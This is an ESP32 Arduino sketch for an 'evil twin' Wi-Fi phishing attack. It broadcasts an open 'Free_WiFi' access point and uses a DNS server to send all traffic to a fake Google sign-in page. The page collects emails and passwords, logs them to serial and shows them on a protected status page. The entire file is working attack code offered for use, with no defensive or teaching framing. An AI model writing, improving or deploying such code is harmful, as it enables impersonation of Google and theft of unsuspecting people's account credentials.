#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String ssid = "Free_WiFi";
String capturedCreds = "";
const char* adminUser = "Ayush";
const char* adminPass = "Ayush-xid-su";   // Change this

// Improved Google-style Login Page (matches your screenshot)
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Sign in - Google Accounts</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {font-family: Arial, sans-serif; background:#fff; margin:0; padding:20px; display:flex; justify-content:center; align-items:center; min-height:100vh;}
    .container {max-width:400px; text-align:center;}
    .logo {font-size: 72px; font-weight: 400; margin-bottom: 20px; letter-spacing: -2px;}
    .logo span:nth-child(1){color:#4285f4;}
    .logo span:nth-child(2){color:#ea4335;}
    .logo span:nth-child(3){color:#fbbc05;}
    .logo span:nth-child(4){color:#4285f4;}
    .logo span:nth-child(5){color:#34a853;}
    .logo span:nth-child(6){color:#ea4335;}
    h1 {font-size: 24px; margin: 10px 0;}
    p {color: #3c4043; margin-bottom: 30px;}
    input {width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;}
    button {width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px;}
    button:hover {background: #185abc;}
    .footer {margin-top: 30px; font-size: 12px; color: #70757a;}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
    <h1>WIFI ACCESS</h1>
    <p>Sign in with your Google Account to use this WIFI</p>
    
    <form action="/login" method="POST">
      <input type="email" name="user" placeholder="Email or phone" required autofocus>
      <input type="password" name="pass" placeholder="Password" required>
      <button type="submit">Next</button>
    </form>
    
    <div class="footer">
      <p>Not your computer? Use Guest mode to sign in privately.</p>
    </div>
  </div>
</body>
</html>
)rawliteral";

void handleLoginPage() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  String user = server.arg("user");
  String pass = server.arg("pass");
  
  capturedCreds += "Time: " + String(millis()/1000) + "s | User: " + user + " | Pass: " + pass + "\n\n";
  
  Serial.println("\n=== GOOGLE PHISH CAPTURED ===");
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);
  Serial.println("===========================\n");
  
  String success = "<h2>Signing in...</h2><p>Welcome! Redirecting to Gmail...</p>";
  server.send(200, "text/html", success);
}

bool isAuthenticated() {
  if (server.authenticate(adminUser, adminPass)) return true;
  server.requestAuthentication();
  return false;
}

void handleStatus() {
  if (!isAuthenticated()) return;
  
  String html = "<h1>Evil Twin Status - Protected</h1>";
  html += "<p><b>SSID:</b> " + ssid + "</p>";
  html += "<p><b>Connected Devices:</b> " + String(WiFi.softAPgetStationNum()) + "</p>";
  html += "<h2>Captured Credentials:</h2><pre>" + capturedCreds + "</pre>";
  html += "<p><a href='/'>Open Fake Google Login</a></p>";
  server.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n=== Google Evil Twin Started ===");
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str());
  
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());
  
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", handleLoginPage);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/status", handleStatus);
  server.onNotFound(handleLoginPage);
  
  server.begin();
  
  Serial.println("Ready!");
  Serial.println("Status URL: http://192.168.4.1/status");
  Serial.println("Admin User: " + String(adminUser));
  Serial.println("Admin Pass: " + String(adminPass));
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  static unsigned long last = 0;
  if (millis() - last > 5000) {
    last = millis();
    Serial.printf("Devices: %d\n", WiFi.softAPgetStationNum());
  }
}